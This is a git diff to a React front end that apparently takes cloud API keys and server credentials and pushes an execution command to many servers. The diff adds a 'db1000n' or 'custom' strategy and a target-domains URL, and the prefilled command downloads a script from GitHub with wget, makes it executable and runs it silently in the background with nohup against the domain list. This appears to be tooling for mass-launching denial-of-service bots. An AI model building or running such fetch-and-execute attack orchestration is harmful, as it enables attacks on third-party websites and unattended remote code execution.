@@ -31,6 +31,7 @@ function App() {
   const $login = useRef();
   const $password = useRef();
   const $exec = useRef();
+  const $domainsURL = useRef();
   const [state, setState] = useState({
     perf: []
   })
@@ -41,6 +42,8 @@ function App() {
     password: ''
   })
   const [loadingState, setLoadingState] = useState({})
+  const [strategy, setStrategy] = useState('db1000n')
+  const [domainsURL, setDomainsURL] = useState("https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/list.txt")
 
   const setLoading = (apiKey, loading) => {
     setLoadingState(prev => ({
@@ -403,7 +406,7 @@ function App() {
         <div className="row">
           <div className="col-9">
             <label className="form-label">Api key:</label>
-            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"}/>
+            <textarea ref={$ta} className="form-control mb-1" defaultValue={apiKeys && apiKeys.join('\n')} rows={"4"} cols={"75"} />
           </div>
           <div className="col-3">
             <label className="form-label">Login:</label>
@@ -412,10 +415,33 @@ function App() {
             <input type="text" ref={$password} className="form-control mb-1" defaultValue={creds.password} />
           </div>
         </div>
+        <div className="row my-2">
+          <div className="col">
+            <h4>Strategy</h4>
+            <div className="form-check form-check-inline">
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" onChange={() => setStrategy('db1000n')} checked={strategy === 'db1000n'}/>
+              <label className="form-check-label" htmlFor="flexRadioDefault2">
+                DB1000N
+              </label>
+            </div>
+            <div className="form-check form-check-inline">
+              <input className="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onChange={() => setStrategy('custom')}/>
+              <label className="form-check-label" htmlFor="flexRadioDefault1">
+                Custom
+              </label>
+            </div>
+          </div>
+        </div>
+        {strategy === 'custom' && <div className="row my-2">
+          <div className="col">
+            <h5>Domains file URL</h5>
+            <input type="text" className="form-control mb-1" value={domainsURL} onChange={e => setDomainsURL(e.target.value)}/>
+          </div>
+        </div>}
         <div className="row">
           <div className="col">
             <label className="form-label">Exec command:</label>
-            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" defaultValue={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f list >/dev/null 2>&1 &'} />
+            <textarea ref={$exec} rows={"4"} cols={"75"} className="form-control mb-1" onChange={() => {}} value={'#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/'+ (strategy === 'custom' ? 'custom' : 'db1000n') + '.txt && chmod +x a.sh && nohup ./a.sh -u {login} -p {password} -f '+domainsURL+' >/dev/null 2>&1 &'} />
           </div>
         </div>
         <button className="btn btn-primary mt-2" onClick={processApiKeys}>Process keys</button>
@@ -424,7 +450,7 @@ function App() {
           {apiKeys.map(apiKey => (
             <div className="card mb-2" key={apiKey}>
               {loadingState[apiKey] && <Style.ProgressContainer>
-                <i class="bi bi-arrow-clockwise"></i>
+                <i className="bi bi-arrow-clockwise"></i>
               </Style.ProgressContainer>}
               <div className="card-body">
                 <h5 className="card-title">{apiKey}</h5>
